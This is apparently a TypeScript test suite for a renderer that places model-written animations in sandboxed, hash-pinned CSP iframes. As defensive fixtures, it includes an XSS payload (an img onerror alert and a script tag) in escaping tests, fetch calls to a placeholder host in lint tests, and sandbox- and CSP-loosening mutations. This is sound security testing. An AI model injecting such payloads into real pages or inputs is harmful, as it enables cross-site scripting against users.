  it('the srcdoc carries the exact CSP whose hashes match its two scripts (shell, then model)', () => {
    const srcdoc = srcdocOf(html);
    expect(srcdoc).toBe(animationSrcdoc(b));
    const doc = parseHtml(srcdoc);
    const scripts: string[] = [];
    const metas: Record<string, string>[] = [];
    const walk = (n: { nodeName: string; childNodes?: unknown[]; attrs?: { name: string; value: string }[] }): void => {
      if (n.nodeName === 'script') {
        const t = (n.childNodes?.[0] as { value?: string } | undefined)?.value ?? '';
        scripts.push(t);
      }
      if (n.nodeName === 'meta') metas.push(Object.fromEntries((n.attrs ?? []).map((a) => [a.name, a.value])));
      for (const c of n.childNodes ?? []) walk(c as typeof n);
    };
    walk(doc as unknown as Parameters<typeof walk>[0]);
    expect(scripts).toEqual([ANIMATION_SHELL_JS, PACKING_JS]);
    const csp = metas.find((m) => m['http-equiv'] === 'Content-Security-Policy')?.content;
    const [h1, h2] = [sha(ANIMATION_SHELL_JS), sha(PACKING_JS)];
    expect(animationHashes(b)).toEqual([h1, h2]);
    expect(csp).toBe(
      `default-src 'none'; script-src ${h1} ${h2}; style-src 'unsafe-inline'; img-src data:; font-src 'none'; ` +
        "connect-src 'none'; media-src 'none'; object-src 'none'; frame-src 'none'; worker-src 'none'; " +
        "form-action 'none'; base-uri 'none'",
    );
    expect(animationCsp([h1, h2])).toBe(csp);
    expect(srcdoc).toContain(`<style id="eli5-anim-shell">${ANIMATION_SHELL_CSS}</style>`);
    expect(srcdoc.indexOf('Content-Security-Policy')).toBeLessThan(srcdoc.indexOf('<style'));
  });

  it('keeps the runtime 1.3.0 shell (version 1) byte for byte, so frames built with it still parse', () => {
    expect(ANIMATION_SHELLS[0]).toEqual({ js: ANIMATION_SHELL_JS, css: ANIMATION_SHELL_CSS });
    const v1 = ANIMATION_SHELLS[3];
    if (!v1) throw new Error('version 1 shell missing');
    // The hashes of the shell that commit A1 shipped (runtime 1.3.0).
    expect(sha(v1.js)).toBe("'sha256-e0IZQWdbe3ACvYq4uAxQ5qL1XqULufinduwV3RqYVMk='");
    expect(sha(v1.css)).toBe("'sha256-nentYDor5iJOQ+BDzCJkcAJKPRDCX5jT9AJYvp4uZOg='");
    const current = animationSrcdoc(b);
    const old = current
      .replace(sha(ANIMATION_SHELL_JS), () => sha(v1.js))
      .replace(ANIMATION_SHELL_CSS, () => v1.css)
      .replace(ANIMATION_SHELL_JS, () => v1.js);
    expect(old).not.toBe(current);
    expect(parseAnimationSrcdoc(old)?.hashes).toEqual([sha(v1.js), sha(PACKING_JS)]);
    expect(parseAnimationSrcdoc(current)?.hashes).toEqual([sha(ANIMATION_SHELL_JS), sha(PACKING_JS)]);
    // Older shells are read, never written: rendering an old frame's parts upgrades it to the
    // current shell (as the runtime refresh on open does), so it does not round-trip byte for byte.
    const parts = parseAnimationSrcdoc(old);
    if (!parts) throw new Error('old frame did not parse');
    expect(animationSrcdoc(parts)).toBe(current);
  });

  it('keeps the runtime 1.3.2 shell (version 3) byte for byte; version 4 only adds the copy and navigation guards', () => {
    const v3 = ANIMATION_SHELLS[1];
    if (!v3) throw new Error('version 3 shell missing');
    expect(sha(v3.js)).toBe("'sha256-CuW7KActI4XR8Y5CzOBDl6275PF6kd1D5JI8jAW/EEA='");
    expect(v3.css).toBe(ANIMATION_SHELL_CSS);
    for (const piece of [
      "copyGuard(W.Node.prototype, 'cloneNode');",
      "copyGuard(DP, 'importNode');",
      "kill(W, 'navigation');",
    ]) {
      expect(ANIMATION_SHELL_JS).toContain(piece);
      expect(v3.js).not.toContain(piece);
    }
    const current = animationSrcdoc(b);
    const old = current.replace(sha(ANIMATION_SHELL_JS), () => sha(v3.js)).replace(ANIMATION_SHELL_JS, () => v3.js);
    expect(old).not.toBe(current);
    expect(parseAnimationSrcdoc(old)?.hashes).toEqual([sha(v3.js), sha(PACKING_JS)]);
    const parts = parseAnimationSrcdoc(old);
    if (!parts) throw new Error('version 3 frame did not parse');
    expect(animationSrcdoc(parts)).toBe(current);
  });

  it('keeps the runtime 1.3.1 shell (version 2) byte for byte; version 3 only adds the custom-elements kill', () => {
    const v2 = ANIMATION_SHELLS[2];
    if (!v2) throw new Error('version 2 shell missing');
    expect(sha(v2.js)).toBe("'sha256-qapybaZtPi+c5Z1d6LGoe3kSdvMLnHX5sxin4stl5r0='");
    expect(sha(v2.css)).toBe("'sha256-5FeL6y3VrX++DJ9B2wc2DA6xLWo3NFwwCZOL9bd3eNk='");
    expect(ANIMATION_SHELL_JS).toContain("kill(W, 'customElements');");
    expect(ANIMATION_SHELL_JS).toContain("guard(W.CustomElementRegistry.prototype, 'define')");
    const current = animationSrcdoc(b);
    const old = current.replace(sha(ANIMATION_SHELL_JS), () => sha(v2.js)).replace(ANIMATION_SHELL_JS, () => v2.js);
    expect(old).not.toBe(current);
    expect(parseAnimationSrcdoc(old)?.hashes).toEqual([sha(v2.js), sha(PACKING_JS)]);
    const parts = parseAnimationSrcdoc(old);
    if (!parts) throw new Error('version 2 frame did not parse');
    expect(animationSrcdoc(parts)).toBe(current);
  });

  it('is deterministic and escapes model text', () => {
    expect(renderAnimationFigure(b, 'sec-indepth-0000aaaa-b1')).toBe(html);
    const evil = renderAnimationFigure(
      { ...b, title: '"><img src=x onerror=alert(1)>', caption: '<script>1</script>' },
      'b',
    );
    expect(evil).not.toMatch(/<img|<script/);
  });
});

describe('the parent document CSP (07 §6.2)', () => {
  it('admits the runtime plus each animation script by hash; frame-src stays none', () => {
    const show = fixtureDocument('showcase');
    const html = renderDocument(show.model, show.assets, { runtime: STUB_RUNTIME, theme: show.theme });
    const b = show.model.tabs[0]?.sections.flatMap((s) => s.blocks).find((x) => x.type === 'animation');
    if (b?.type !== 'animation') throw new Error('showcase has no animation');
    const [h1, h2] = animationHashes(b);
    const csp = cspOf(html).replace(/&#39;/g, "'");
    expect(csp).toBe(documentCsp(STUB_RUNTIME.js, [h1, h2]));
    expect(csp).toContain(`script-src ${scriptHash(STUB_RUNTIME.js)} ${h1} ${h2};`);
    expect(csp).toContain("frame-src 'none'");
    expect(validateDocument(html).errors).toEqual([]);
  });

  it('a document without animations keeps the old policy byte for byte', () => {
    const full = fixtureDocument('full');
    const html = renderDocument(full.model, full.assets, { runtime: STUB_RUNTIME, theme: full.theme });
    expect(documentCsp(STUB_RUNTIME.js)).toBe(
      "default-src 'none'; img-src data:; style-src 'unsafe-inline'; font-src data:; " +
        `script-src ${scriptHash(STUB_RUNTIME.js)}; connect-src 'none'; media-src 'none'; object-src 'none'; ` +
        "frame-src 'none'; form-action 'none'; base-uri 'none'",
    );
    expect(cspOf(html)).toContain(`script-src ${scriptHash(STUB_RUNTIME.js)};`);
    expect(html).not.toContain('<iframe');
  });
});

describe('validity: the only allowed iframe shape (07 §6.2, 13 §7.1)', () => {
  const show = fixtureDocument('showcase');
  const good = renderDocument(show.model, show.assets, { runtime: STUB_RUNTIME, theme: show.theme });
  const rules = (html: string): string[] => validateDocument(html).errors.map((e) => e.rule);

  it('accepts the rendered animation', () => {
    expect(good).toContain('<figure class="animation">');
    expect(validateDocument(good).errors).toEqual([]);
  });

  const mutations: [string, (h: string) => string][] = [
    ['a looser sandbox', (h) => h.replace('sandbox="allow-scripts"', 'sandbox="allow-scripts allow-same-origin"')],
    ['no sandbox', (h) => h.replace('sandbox="allow-scripts" ', '')],
    [
      'a src',
      (h) => h.replace('<iframe sandbox="allow-scripts"', '<iframe src="https://x.example/" sandbox="allow-scripts"'),
    ],
    ['an extra attribute', (h) => h.replace('loading="lazy"', 'loading="lazy" allow="camera"')],
    // Same count, one allowed attribute swapped for another (audit round 3).
    ['an allowed attribute swapped for another', (h) => h.replace('loading="lazy"', 'allow="camera; microphone"')],
    [
      'two allowed attributes in another order',
      (h) => h.replace(/ referrerpolicy="no-referrer" loading="lazy"/, ' loading="lazy" referrerpolicy="no-referrer"'),
    ],
    [
      'a looser inner CSP',
      (h) => {
        const at = h.lastIndexOf("connect-src 'none'"); // the srcdoc's policy, after the head's
        return `${h.slice(0, at)}connect-src *${h.slice(at + "connect-src 'none'".length)}`;
      },
    ],
    [
      'model code that no longer matches its hash',
      (h) => {
        const at = h.lastIndexOf("ELI5.button('Replay'"); // in the srcdoc, after the model JSON
        return `${h.slice(0, at)}ELI5.button('Again'${h.slice(at + "ELI5.button('Replay'".length)}`;
      },
    ],
    [
      'a third script',
      (h) => h.replace('&lt;/body&gt;&lt;/html&gt;"', '&lt;script&gt;x()&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;"'),
    ],
    ['a frame outside an animation figure', (h) => h.replace('<figure class="animation">', '<figure class="diagram">')],
    ['the parent CSP without the frame hashes', (h) => h.replace(/(script-src '[^']+')[^;]*;/, '$1;')],
  ];
  it.each(mutations)('rejects %s', (_name, mutate) => {
    const bad = mutate(good);
    expect(bad).not.toBe(good);
    expect(rules(bad).length).toBeGreaterThan(0);
  });

  it('checks stored code for structure, not the current lint (audit round 3)', () => {
    // Code the current lint flags stands for code a later, stricter lint would flag: it was linted
    // when written, so validity does not judge it again; the frame skeleton, hashes and CSP still are.
    const show2 = fixtureDocument('showcase');
    const b = show2.model.tabs[0]?.sections.flatMap((s) => s.blocks).find((x) => x.type === 'animation');
    if (b?.type !== 'animation') throw new Error('fixture');
    b.js = `${b.js}\nfetch('https://x.example')`;
    const html = renderDocument(show2.model, show2.assets, { runtime: STUB_RUNTIME, theme: show2.theme });
    expect(rules(html)).not.toContain('animation-frame');
    expect(srcdocOf(html)).toContain("connect-src 'none'");
    // Oversized code is still rejected.
    b.js = `${b.js}\n${'x'.repeat(17 * 1024)}`;
    const big = renderDocument(show2.model, show2.assets, { runtime: STUB_RUNTIME, theme: show2.theme });
    expect(rules(big)).toContain('animation-frame');
  });
});

describe('parse and round-trip (07 §5.5, §8)', () => {
  it('render(parse(html)) is byte-identical for the showcase golden', () => {
    const golden = readGolden('showcase');
    const p = parseDocument(golden);
    expect(renderDocument(p.model, p.assets, { runtime: p.runtime, theme: p.theme })).toBe(golden);
    expect(validateDocument(golden).errors).toEqual([]);
  });

  it('a stored animation survives parse and a keep even when the lint would now flag it (audit round 3)', () => {
    const golden = readGolden('showcase');
    const p = parseDocument(golden);
    const n = animationsOf(p.model);
    const model = structuredClone(p.model);
    const flagged = 'ELI5.readout("x").set(1);\nfetch("https://x.example")';
    for (const t of model.tabs)
      for (const s of t.sections) s.blocks = s.blocks.map((x) => (x.type === 'animation' ? { ...x, js: flagged } : x));
    const html = renderDocument(model, p.assets, { runtime: p.runtime, theme: p.theme });
    const again = parseDocument(html).model;
    expect(animationsOf(again)).toBe(n);
    expect(validateDocument(html).errors).toEqual([]);
    // A keep marker takes the stored block back unchanged.
    const sec = again.tabs[0]?.sections.find((s) => s.blocks.some((x) => x.type === 'animation'));
    if (!sec) throw new Error('fixture');
    const keep: DraftBlock = {
      type: 'animation',
      title: '',
      caption: '',
      alt: '',
      poster: ANIMATION_KEEP,
      js: ANIMATION_KEEP,
    } as DraftBlock;
    const r = replaceSection(again, sec.id, section('Again', para('Short.'), keep), 'reexplain', NOW);
    expect(r.warnings).not.toContain('animation-dropped');
    const kept2 = r.model.tabs[0]?.sections.find((s) => s.id === sec.id)?.blocks.find((x) => x.type === 'animation');
    expect(kept2?.type === 'animation' && kept2.js).toBe(flagged);
    // New code from the model is still linted.
    expect(convert([{ ...A, js: flagged }]).warnings).toContain('animation-dropped');
  });

  it('a hand-edited model with a bad poster or oversized code loses that animation on parse', () => {
    const golden = readGolden('showcase');
    const p = parseDocument(golden);
    const b = p.model.tabs[0]?.sections.flatMap((s) => s.blocks).find((x) => x.type === 'animation');
    if (b?.type !== 'animation') throw new Error('fixture');
    for (const edit of [{ js: 'x'.repeat(17 * 1024) }, { poster: '<p>no</p>' }, { js: 'keep' }]) {
      const model = structuredClone(p.model);
      for (const t of model.tabs)
        for (const s of t.sections) s.blocks = s.blocks.map((x) => (x.type === 'animation' ? { ...x, ...edit } : x));
      const html = renderDocument(model, p.assets, { runtime: p.runtime, theme: p.theme });
      expect(animationsOf(parseDocument(html).model)).toBe(0);
    }
  });

  it('old two-tab documents are unaffected: no frame, one script hash', () => {
    for (const name of ['full', 'placeholder', 'themed'] as const) {
      const g = readGolden(name);
      expect(g).not.toContain('<iframe');
      expect(cspOf(g).match(/sha256-/g)).toHaveLength(1);
      const p = parseDocument(g);
      expect(renderDocument(p.model, p.assets, { runtime: p.runtime, theme: p.theme })).toBe(g);
    }
  });
});

describe('other consumers', () => {
  it('draft validation accepts an animation and never asks for a repair over its code', () => {
    const ok = validateDraft('SectionDraft', section('H', para('p'), A));
    expect(ok.ok && ok.dropped).toEqual([]);
    const linted = validateDraft('SectionDraft', section('H', para('p'), { ...A, js: 'fetch(1)' }));
    expect(linted.ok).toBe(true);
  });

  it('section text names the animation by title and alt', () => {
    expect(sectionText(section('H', A))).toBe(`H\nAnimation: ${A.title}. ${A.alt}`);
  });
});
